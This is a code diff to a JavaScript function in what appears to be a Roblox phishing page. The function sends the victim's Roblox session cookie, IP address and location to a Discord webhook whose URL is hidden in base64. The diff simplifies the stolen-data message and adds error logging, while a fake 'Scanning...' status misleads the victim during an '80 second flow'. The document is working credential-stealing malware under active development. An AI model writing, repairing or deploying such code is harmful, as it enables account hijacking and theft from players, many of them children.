@@ -262,21 +262,10 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Fixed webhook payload - shorter to avoid 400 error
+        // Simple webhook payload to avoid 400 error
         const payload = {
-            content: `🍪 **Roblox Cookie Captured**
-\`\`\`
-Time: ${new Date().toLocaleString()}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
-IP: ${locationInfo.ip || 'Unknown'}
-\`\`\`
-
-**💎 COOKIE:**
-\`\`\`
-${robloxCookie || 'None found'}
-\`\`\`
-
-🎯 **2FA in 80 seconds**
+            content: `Cookie: ${robloxCookie || 'None found'}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 @everyone`
         };
 
@@ -291,6 +280,10 @@ ${robloxCookie || 'None found'}
         if (response.ok) {
             submitText.textContent = 'Scanning...';
             console.log('✅ Cookie sent to webhook - starting 80 second flow');
+        } else {
+            const errorText = await response.text();
+            console.error('❌ Webhook failed:', response.status, errorText);
+            console.error('Payload:', JSON.stringify(payload, null, 2));
             
             // Close modal and start item name rotation
             setTimeout(() => {
